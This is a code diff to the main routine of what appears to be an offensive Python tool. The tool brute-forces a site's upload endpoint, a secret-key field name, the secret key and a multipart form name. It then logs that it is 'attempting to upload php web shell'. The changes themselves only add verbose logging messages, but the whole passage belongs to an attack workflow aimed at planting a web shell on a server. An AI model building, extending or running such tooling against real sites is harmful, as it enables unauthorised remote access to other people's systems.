@@ -59,6 +59,8 @@ def main():
         form_name = args.form_name
 
         if args.brute_endpoint:
+            if args.verbose:
+                Logger.info('brute forcing endpoint...')
             url = Brute.endpoint(url)
             if url is None:
                 Logger.error('endpoint not found')
@@ -66,21 +68,36 @@ def main():
 
         if Brute.is_required(url): # check if it's necessary to brute force field name and secret key
             if args.brute_field:
+                if args.verbose:
+                    Logger.info('brute forcing secret key field name...')
+
                 field_name = Brute.field_name(url)
+
                 if field_name is None:
                     Logger.error('field name not found')
+
                 Logger.success(f'field name found: \x1b[35m{field_name}')
 
             if args.brute_secret:
+                if args.verbose:
+                    Logger.info('brute forcing secret key...')
+
                 secret = Brute.secret(url, field_name)
+
                 if secret is None:
                     Logger.error('secret not found')
+
                 Logger.success(f'secret found: \x1b[35m{secret}')
 
         if args.brute_form:
+            if args.verbose:
+                Logger.info('brute forcing multipart form name...')
+
             form_name = Brute.form_name(url, secret, field_name)
+
             if form_name is None:
                 Logger.error('form name not found')
+
             Logger.success(f'form name found: \x1b[35m{form_name}')
 
         Logger.info('attempting to upload php web shell...')
